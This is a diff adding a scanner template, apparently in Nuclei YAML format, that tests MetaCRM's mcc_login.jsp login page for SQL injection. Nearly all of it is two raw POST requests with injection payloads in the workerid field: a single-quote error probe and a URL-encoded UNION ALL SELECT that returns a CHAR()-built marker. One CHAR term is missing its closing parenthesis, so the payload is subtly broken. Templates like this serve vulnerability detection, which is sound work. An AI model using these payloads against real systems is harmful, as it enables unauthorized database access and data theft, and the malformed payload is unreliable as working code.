@@ -1,0 +1,42 @@
+id: poc-yaml-metacrm-mcc-login-jsp-sqli
+info:
+  name: MetaCRM MCC Login SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    MetaCRM Customer Relationship Management System mcc_login.jsp is vulnerable to SQL injection. The vulnerability allows attackers to execute arbitrary SQL commands, potentially leading to data leakage or unauthorized access.
+http:
+  - raw:
+      - |
+        POST /si/callcenter/solarun/mcc_login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        workerid=1%27&passwd=ab123def&rtype=call400
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+  - raw:
+      - |
+        POST /si/callcenter/solarun/mcc_login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        workerid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28103%29%2BCHAR%28100%29%2BCHAR%2875%29%2BCHAR%28105%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2890%29%2BCHAR%2873%29%2BCHAR%28105%29%2BCHAR%2873%29%2BCHAR%28104%29%2BCHAR%28104%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%2887%29%2BCHAR%2883%29%2BCHAR%28121%29%2BCHAR%28114%29%2BCHAR%28106%29%2BCHAR%2881%2BCHAR%2866%29%2BCHAR%2890%29%2BCHAR%2865%29--+ewaD&passwd=ab123def&rtype=call400
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "name=\"username\""
+          - "qjzvqgdKiLQZIiIhhjbWSyrjQBZA"
